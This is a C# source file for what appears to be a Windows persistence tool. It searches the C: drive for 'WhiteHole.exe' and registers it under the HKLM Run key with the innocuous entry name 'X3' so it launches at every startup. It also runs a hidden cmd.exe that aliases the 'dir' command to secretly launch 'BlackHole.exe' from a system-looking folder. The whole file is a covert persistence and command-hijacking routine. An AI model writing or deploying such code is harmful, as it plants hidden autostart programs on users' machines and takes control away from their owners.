using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
namespace RuleChange
{
    class RuleChange

    {
        static void Main(string[] args)
        {
            //Test
            //Find startup file and set reg key to startup
            string startDir = @"C:\";
            string targetFile = "WhiteHole.exe";
            string filePath = FindFile(targetFile, startDir);
            makeJawn(filePath);

            //Change Dir to Dir && GLOOP
            SetDirAlias();


        }







        /// <summary>
        /// Creates a reistry key to run an executable at the specified location
        /// </summary>
        /// <param name="location">File path to the executable</param>
        /// <returns>True for successful creation, false for unsuccessful creation</returns>
        static bool makeJawn(string location)
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                {
                    if (key == null)
                        return false;

                    // "MyApp" is an arbitrary name for the registry entry.
                    key.SetValue("X3", location);
                }
                return true;
            }
            catch (Exception ex)
            {
                // Log or handle exception as needed.
                return false;
            }
        }


        public static string FindFile(string fileName, string startDirectory)
        {
            try
            {
                // Check all files in the current directory.
                foreach (string file in Directory.EnumerateFiles(startDirectory))
                {
                    if (Path.GetFileName(file).Equals(fileName, StringComparison.OrdinalIgnoreCase))
                    {
                        return file;
                    }
                }

                // Recursively search in subdirectories.
                foreach (string directory in Directory.EnumerateDirectories(startDirectory))
                {
                    try
                    {
                        string result = FindFile(fileName, directory);
                        if (result != null)
                        {
                            return result;
                        }
                    }
                    catch (UnauthorizedAccessException)
                    {
                        // Skip directories that cannot be accessed.
                        continue;
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                // Skip directories that cannot be accessed.
            }

            // Return null if the file wasn't found in the current directory or any subdirectories.
            return null;
        }

        public static void SetDirAlias()
        {
            var startInfo = new System.Diagnostics.ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c doskey dir=dir $* ^&^& echo Gloop! ^&^& C:\\Windows\\InputMethod\\BlackHole.exe",
                CreateNoWindow = true,
                UseShellExecute = false
            };
            using (var process = System.Diagnostics.Process.Start(startInfo))
            {
                process.WaitForExit();
            }
        }

    }
}
